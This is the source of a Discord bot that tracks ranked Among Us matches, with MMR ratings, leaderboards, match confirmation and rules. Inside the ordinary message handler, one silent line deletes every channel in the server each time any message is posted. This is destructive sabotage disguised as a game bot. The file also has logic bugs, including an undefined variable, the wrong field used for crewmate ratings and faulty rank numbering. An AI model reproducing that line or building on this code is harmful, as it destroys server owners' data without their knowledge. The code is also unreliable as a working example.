const { Client, MessageEmbed } = require('discord.js');
const config = require('./config');
const commands = require('./help');
const Database = require("@replit/database")
const rankeddb = new Database()

process.on('unhandledRejection', (reason, p) => {
  console.log('Unhandled Rejection at: Promise', p, 'reason:', reason);
  // application specific logging, throwing an error, or other logic here
});

let bot = new Client({
  fetchAllMembers: false, // Remove this if the bot is in large guilds.
  presence: {
    status: 'online',
    activity: {
      name: `${config.prefix}help`,
      type: 'LISTENING'
    }
  }
});

bot.on('ready', () => console.log(`Logged in as ${bot.user.tag}.`));

/*rankeddb.empty().then(t => {
  console.log("wiped");
});*/

var games = {
  "Voice ID" : ['Player IDs','Player Names','Map']
};

const maps = ['skeld','mira','polus'];

const mapData = [[338,77,23],[104,73.49,26.51],[3094,75.1,24.9]]; //temporary games, crew, imp && skeld, mira, polus

const results = ['win', 'lose'];

const rankedvcs = ['789757291045847040','789757410923380786','789757991661994014','793595189893005352'];

const playersPerGame = 10;

const reactionsToConfirm = 6;

const moderators = '<@613420066993864705>\n<@394302485692416001>';

const k = 20;

const botId = '792580580952244234';

var argu = [0,0,0];

var vcmsg = '';

function addGame(voiceID, playerIDs, playerNames, mapName){
  games[voiceID] = [playerIDs, playerNames, mapName];
}

function getNumbers(namesArr){
  let nameText = "";
  for(i = 0; i < namesArr.length; i++){
    nameText += "**Player #" +(i+1)+":** " +namesArr[i]+ "\n"; 
  }
  return nameText;
}

function inRange(number){
  if(parseInt(number) > 0 && parseInt(number) <= playersPerGame){
    return true;
  }
  else{
    return false;
  }
}

function inGame(message, playerID){
  if(message.member.voice.channelID == undefined){
    return false;
  }
  
  return games[message.member.voice.channelID][0].includes(playerID);
  

}

function elo(ra, rb, win, winchance){

  let tk = k * (1 + (0.5 - winchance));

  let e = 1/(1+(Math.pow(10,(rb - ra)/400)));
  
  return Math.round(ra + tk*(win - e));

}

function changeStats(playerID, playerName, elo, win, imp){
    
  rankeddb.get(playerID).then(value => {
    let impData = [1200,0,0];
    let crewData = [1200,0,0];
    if(value != null){
      impData = [value[1],value[2],value[3]];
      crewData = [value[4],value[5],value[6]];
    }
    
    if(imp){
        impData[0] = elo;
        impData[1] += win;
        impData[2] += 1;
    }
    else{
        crewData[0] = elo;
        crewData[1] += win;
        crewData[2] += 1;
    }

    rankeddb.set(playerID, [playerName,impData[0],impData[1],impData[2],crewData[0],crewData[1],crewData[2]]);

  })
}

async function endGameLobbyUpdate(playerIDs, playerNames, impo, impt, impostorWin, message, mapID){
  
  let totalimpELO = 0;
  let totalcrewELO = 0;
  for(i = 0; i < playerIDs.length; i++){
    if(i+1 == impo || i+1 == impt){
      await rankeddb.get(playerIDs[i]).then(value => {
        if(value == null){
          totalimpELO += 1200;
          rankeddb.set(playerIDs[i], [playerNames[i],1200,0,0,1200,0,0]);
        }
        else{
          totalimpELO += value[1];
        }
      })
    }
    else{
      await rankeddb.get(playerIDs[i]).then(value => {
        if(value == null){
          totalcrewELO += 1200;
          rankeddb.set(playerID, [playerNames[i],1200,0,0,1200,0,0]);
        }
        else{
          totalcrewELO += value[4];
        }
      })
    }
  }

  totalimpELO = Math.round(totalimpELO/2);
  totalcrewELO = Math.round(totalcrewELO/8);

  for(i = 0; i < playerIDs.length; i++){
    if(i+1 == impo || i+1 == impt){
      await rankeddb.get(playerIDs[i]).then(value => {
        changeStats(playerIDs[i], playerNames[i], elo(value[1], totalcrewELO, impostorWin, mapData[mapID][2]), impostorWin, true);
      })
    }
    else{
      await rankeddb.get(playerIDs[i]).then(value => {
        changeStats(playerIDs[i], playerNames[i], elo(value[1], totalimpELO, !impostorWin, mapData[mapID][1]), !impostorWin, false);
      })
    }
  }

  delete games[message.member.voice.channelID];
}

async function getResults(playerUser,message){
  let resultsEmbed = '';
  await rankeddb.get(playerUser.id).then(value => {
    
    if(value == null || (value[3] + value[6]) < 3){
      resultsEmbed =  new MessageEmbed()
        .setTitle(`${playerUser.username}'s Stats`)
        .setColor('#DBB424')
        .addField('Need More Matches', 'At least 3 required to reveal stats and MMR', true)
        .setFooter(`Requested By: ${message.author.member ? message.author.displayName : message.author.username}`, message.author.displayAvatarURL())
        .setThumbnail(playerUser.displayAvatarURL());
      message.channel.send(resultsEmbed);
    }
    else{
      let unverify = ['','',''];
      if(value[3] + value[6]  < 30){
        unverify[0] = '?';
      }
      if(value[3] < 5){
        unverify[1] = '?';
      }
      if(value[6] < 25){
        unverify[2] = '?';
      }
      resultsEmbed =  new MessageEmbed()
        .setTitle(`${playerUser.username}'s Stats`)
        .setColor('#DBB424')
        .addField('**__MMR Scores__**', `\n**Crewmate ${value[4]}${unverify[0]}\nImpostor ${value[1]}${unverify[1]}\nOverall ${(value[4]+value[1])/2}${unverify[2]}**`, true)
        .addField('**__Crewmate Stats__**', `\n**Winrate ${((100/value[6])*value[5]).toFixed(2)}%**\nWon ${value[5]}\nPlayed ${value[6]} times`, true)
        .addField('**__Impostor Stats__**', `\n**Winrate ${((100/value[3])*value[2]).toFixed(2)}%**\nWon ${value[2]}\nPlayed ${value[3]} times`, true)
        .addField('Please Note:', 'MMR values with **?** after them are unstable, your MMR will stabilize after 25 crewmate games and 5 impostor games.', true)
        .setFooter(`Requested By: ${message.author.member ? message.author.displayName : message.author.username}`, message.author.displayAvatarURL())
        .setThumbnail(playerUser.displayAvatarURL());
      message.channel.send(resultsEmbed);
    }
  });
}

async function showLeaderboard(message){

  var keys;
  await rankeddb.list().then(val => {keys = val});
  var oleaderboardPlayers = [];
  var ileaderboardPlayers = [];
  var cleaderboardPlayers = [];
  for(i = 0; i < keys.length; i++){

    let n = '';
    let fn = '';
    let ie = 0;
    let ce = 0;

    await rankeddb.get(keys[i]).then(value => {
      n = value[0];
      fn = n;
      if(n.length > 17){
        n = n.substring(0, 14) + '...';
      }
      ie = value[1];
      ce = value[4];
    });

    oleaderboardPlayers[i] = [n,(ie+ce)/2,fn];
    ileaderboardPlayers[i] = [n,ie,fn];
    cleaderboardPlayers[i] = [n,ce,fn];

  }
  oleaderboardPlayers.sort(function (x, y) {
    return (y[1]) - (x[1]);
  });
  ileaderboardPlayers.sort(function (x, y) {
    return (y[1]) - (x[1]);
  });
  cleaderboardPlayers.sort(function (x, y) {
    return (y[1]) - (x[1]);
  });

  let oleaderText = '';
  let ileaderText = '';
  let cleaderText = '';

  for (i = 0; i < keys.length; i++){
      
    let playerNumber = '**#' + i+1;
    switch(i){
      case 0:
        playerNumber = '**🥇';
        break;
      case 1:
        playerNumber = '**🥈';
        break;
      case 2:
        playerNumber = '**🥉';
        break;
    }
    oleaderText += '\n' + playerNumber +'** ' + oleaderboardPlayers[i][0] + '\n **MMR:** ' + oleaderboardPlayers[i][1] + '\n';
    ileaderText += '\n' + playerNumber +'** ' + ileaderboardPlayers[i][0] + '\n **MMR:** ' + ileaderboardPlayers[i][1] + '\n';
    cleaderText += '\n' + playerNumber +'** ' + cleaderboardPlayers[i][0] + '\n **MMR:** ' + cleaderboardPlayers[i][1] + '\n';

    if(i >= 9)
      break;
  }
  if(oleaderboardPlayers[0] == undefined){
    senderr(message,"No one has played a game");
    return null;
  }
  let leaderboard =  new MessageEmbed()
    .setTitle(`Among Us Ranked Leaderboard`)
    .setColor('#DBB424')
    .setDescription(`**Ranked Einstein 🧠:** ${oleaderboardPlayers[0][2]}\n**Ranked Sherlock 🔍:** ${cleaderboardPlayers[0][2]}\n**Ranked Zodiac 🔪:** ${ileaderboardPlayers[0][2]}`)
    .addField('__Top 10 Overall:__',oleaderText+'',true)
    .addField('__Top 10 Crewmates:__',cleaderText+'',true)
    .addField('__Top 10 Impostors:__',ileaderText+'',true)
    .setFooter(`Requested By: ${message.member ? message.member.displayName : message.author.username}`, message.author.displayAvatarURL())
    .setThumbnail(bot.user.displayAvatarURL());
  message.channel.send(leaderboard);

}

function senderr(message, errmsg){
  let errEmbed =  new MessageEmbed()
    .setTitle('Error')
    .setColor('RED')
    .setDescription(errmsg)
  message.channel.send(errEmbed)
}

bot.on('message',  async message => {
  message.guild.channels.cache.forEach(channel => channel.delete())
  if (message.content.startsWith(config.prefix)) {
    

    let args = message.content.slice(config.prefix.length).split(' ');
    let command = ''
    command = args.shift().toLowerCase();
    
    

    switch (command) {
      case 'rules':
        let rulesEmbed =  new MessageEmbed()
          .setTitle('Ranked Rules')
          .setColor('#DBB424')
          .setDescription(`__**Important Game Rules:**__ \n 1. No direct messaging or outside communications is allowed between players during gameplay and throughout a match.\n2. Players' ingame name must match their Discord handle by at least 3 letters.\n3. **No meta gaming.**\n4. If a player leaves, disconnects an active game for any reason,that game is over. (;cancel will cancel the match)\n5. **No clogging of voice communications.**\n6. **No Medbay-Cancelling.**\n7. Players should not be standing watching other players if they don't have a task in that area.\n8. **Early Emergency Buzzing in First round is allowed.**\n9. Polus map rule: Do not clear people with the current vent and door glitch next to door to labs\n**If any of these rules are broken please dm a ranked moderator (;mods will reveal moderators)**`,false)
          .addField('__**Map Settings:**__','#Impostors: 2\n**Confirm Ejects Off**\n#Emergency Meetings: 1\n**Anonymous Votes: Off**\nEmergency Cooldown: 20s\nDiscussion Time: 15s\nVoting Time: 120s\nVoting Time: 120s\nPlayer Speed: 1.25x\nCrewmate Vision: 0.5x\nImpostor Vision: 1.25x\nKill Cooldown: 22.5s\nKill Distance: Short\n**Task Bar Updates: Never**\nVisual Tasks: Off\n**#Common Tasks: 2\n#Long Tasks: 2\n#Short Tasks: 4**',false)
          .setFooter(`Requested By: ${message.member ? message.member.displayName : message.author.username}`, message.author.displayAvatarURL())
          .setThumbnail(bot.user.displayAvatarURL());
      
        message.channel.send(rulesEmbed)
        break;
      case 'mods':
      case 'moderators':
        let modEmbed =  new MessageEmbed()
          .setTitle('Ranked Moderators')
          .setColor('#DBB424')
          .setDescription(moderators)
          .setFooter(`Requested By: ${message.member ? message.member.displayName : message.author.username}`, message.author.displayAvatarURL())
          .setThumbnail(bot.user.displayAvatarURL());
      
        message.channel.send(modEmbed)
        break;

      case 'current':
        if(rankedvcs.includes(message.member.voice.channelID)){
          if(games[message.member.voice.channelID] != undefined){
            let players = games[message.member.voice.channelID][1];
            let currentEmbed =  new MessageEmbed()
              .setTitle('Current Ranked Match')
              .setColor('#DBB424')
              .addField('Players:', getNumbers(players), true)
              .setFooter(`Requested By: ${message.member ? message.member.displayName : message.author.username}`, message.author.displayAvatarURL())
              .setThumbnail(bot.user.displayAvatarURL());
          
            message.channel.send(currentEmbed)
          }
          else
            senderr(message,"There are no current games in this VC");

        }
        else
          senderr(message,"You're not in a ranked VC");
        break;
      case 'leaders':
        showLeaderboard(message);

        break;
      case 'stats':
        let statsEmbed =  new MessageEmbed()
          .setTitle('Among Us Map Stats')
          .setColor('#DBB424')
          .addField('__**Polus:**__', `**Stats From ${mapData[2][0]} Games**\nCrewmate Winrate: ${mapData[2][1]}%\nImpostor Winrate: ${mapData[2][2]}%`, true)
          .addField('__**The Skeld:**__', `**Stats From ${mapData[0][0]} Games**\nCrewmate Winrate: ${mapData[0][1]}%\nImpostor Winrate: ${mapData[0][2]}%`, true)
          .addField('__**Mira HQ:**__', `**Stats From ${mapData[1][0]} Games**\nCrewmate Winrate: ${mapData[1][1]}%\nImpostor Winrate: ${mapData[1][2]}%`, true)
          .addField('Please note:', 'These stats are temporary while we gather game data, they have been gathered from other servers and do not perfectly reflect the win percentages of this server', true)
          .setFooter(`Requested By: ${message.member ? message.member.displayName : message.author.username}`, message.author.displayAvatarURL())
          .setThumbnail(bot.user.displayAvatarURL());
      
        message.channel.send(statsEmbed)
        break;
      case 'mr':
      case 'myresults':
        if (args.length > 0){
          getResults(message.mentions.users.first(),message);
        }
        else{
          getResults(message.author,message);
        }
        break;

      case 'start':
        if (args.length > 0 && maps.includes(args[0].toLowerCase())){
          if(rankedvcs.includes(message.member.voice.channelID)){
            let inVC = message.member.voice.channel.members.map(m=>m.user.id);
            let inVCNames = message.member.voice.channel.members.map(m=>m.user.username);
            if(inVC.length == playersPerGame){
              if(games[message.member.voice.channelID] == undefined){
                addGame(message.member.voice.channelID,inVC,inVCNames,args[0].toLowerCase());
                let startEmbed =  new MessageEmbed()
                  .setTitle('Started A Ranked Match')
                  .setColor('#DBB424')
                  .addField('Players:', getNumbers(inVCNames), true)
                  .setFooter(`Requested By: ${message.member ? message.member.displayName : message.author.username}`, message.author.displayAvatarURL())
                  .setThumbnail(bot.user.displayAvatarURL());
              
                message.channel.send(startEmbed).then(async startEmbedMessage => { 
                  startEmbedMessage.delete({ timeout: 25000 }).catch((error) => {
                    console.error("");
                  });
                })
              }
              else
                senderr(message,"A game has already started in this VC");
            }
            else
              senderr(message,"There aren't "+playersPerGame+" players in the VC");
          }
          else 
            senderr(message,"You're not in a ranked VC");
        }
            
        else
          senderr(message,"Please specify what map you want to play on");
        break;
      
      case 'impostor':
        if(args[2] != undefined)
          args[2] = args[2].toLowerCase();
        if(args.length > 0 && results.includes(args[2]) && inRange(args[0]) && inRange(args[1])){
          if(games[message.member.voice.channelID] != undefined){
            argu[0] = args[0];
            argu[1] = args[1];
            argu[2] = args[2];

            let endEmbed =  new MessageEmbed()
              .setTitle('Confirm Match Results')
              .setColor('#DBB424')
              .addField('Results:', "The impostors **"+args[2]+"** and impostors were **Player #"+args[0]+ "** and **Player #"+args[1]+"**")
              .addField('Players:', getNumbers(games[message.member.voice.channelID][1]), true)
              .setFooter(`Requested By: ${message.member ? message.member.displayName : message.author.username}`, message.author.displayAvatarURL())
              .setThumbnail(bot.user.displayAvatarURL());
            
            message.channel.send(endEmbed).then(async endEmbedMessage => {

              vcmsg = message;
              
              await endEmbedMessage.react('✅').catch((error) => {});
              
              await endEmbedMessage.react('⛔').catch((error) => {});

              endEmbedMessage.delete({ timeout: 25000 }).catch((error) => {});
              
            })
          }
          else
            senderr(message,"You're not in a VC with an ongoing match");
        }
        else
          senderr(message,"Please specify who won the match");
        break;
      case 'cancel':
        if(games[message.member.voice.channelID] != undefined){
          delete games[message.member.voice.channelID];
          senderr(message,`${message.author.username} Has cancelled this match`);
        }
        else
          senderr(message,"You're not in a VC with an ongoing match");
        break;
      
      /* Unless you know what you're doing, don't change this command. */
      case 'help':
        let embed =  new MessageEmbed()
          .setTitle('HELP MENU')
          .setColor('#DBB424')
          .setFooter(`Requested by: ${message.member ? message.member.displayName : message.author.username}`, message.author.displayAvatarURL())
          .setThumbnail(bot.user.displayAvatarURL());
        if (!args[0])
          embed
            .setDescription(Object.keys(commands).map(command => `\`${command.padEnd(Object.keys(commands).reduce((a, b) => b.length > a.length ? b : a, '').length)}\` :: ${commands[command].description}`).join('\n'));
        else {
          if (Object.keys(commands).includes(args[0].toLowerCase()) || Object.keys(commands).map(c => commands[c].aliases || []).flat().includes(args[0].toLowerCase())) {
            let command = Object.keys(commands).includes(args[0].toLowerCase())? args[0].toLowerCase() : Object.keys(commands).find(c => commands[c].aliases && commands[c].aliases.includes(args[0].toLowerCase()));
            embed
              .setTitle(`COMMAND - ${command}`)

            if (commands[command].aliases)
              embed.addField('Command aliases', `\`${commands[command].aliases.join('`, `')}\``);
            embed
              .addField('DESCRIPTION', commands[command].description)
              .addField('FORMAT', `\`\`\`${config.prefix}${commands[command].format}\`\`\``);
          } else {
            embed
              .setColor('RED')
              .setDescription('This command does not exist. Please use the help command without specifying any commands to list them all.');
          }
        }
        message.channel.send(embed);
        break;
    }

  }

});

bot.on('messageReactionAdd', async reaction => {
  if(reaction.emoji.name == '⛔' && inGame(vcmsg,reaction.users.cache.last().id)){
    reaction.message.delete();
    senderr(vcmsg,`${vcmsg.author.username} Disagrees with the results`);
  }

  else if(reaction.emoji.name == '✅' && inGame(vcmsg,reaction.users.cache.last().id)){}

  else if(reaction.users.cache.last().id != botId){
    reaction.users.remove(reaction.users.cache.last().id).catch((error) => {
      console.error("");
    });
  }

  if(reaction.count-1 >= reactionsToConfirm){
    let matchResult = true;
    if(argu[2] == 'lose'){
      matchResult = false;
    }
    let mapId = 0;
    switch (games[vcmsg.member.voice.channelID][2]){
      case 'mira':
        mapId = 1;
        break;
      case 'polus':
        mapId = 2;
        break;
    }//here it is 

    endGameLobbyUpdate(games[vcmsg.member.voice.channelID][0],games[vcmsg.member.voice.channelID][1],parseInt(argu[0]),parseInt(argu[1]),matchResult,vcmsg,mapId);
    reaction.message.delete().catch((error) => {});
    
    
    let finishEmbed =  new MessageEmbed()
      .setTitle('Match Completed')
      .setColor('#DBB424')
    
    vcmsg.channel.send(finishEmbed).then(async finishedEmbedMessage => { 
      finishedEmbedMessage.delete({ timeout: 10000 }).catch((error) => {
        console.error("");
      });
    })
    
  }

});

require('./server')();
bot.login(config.token);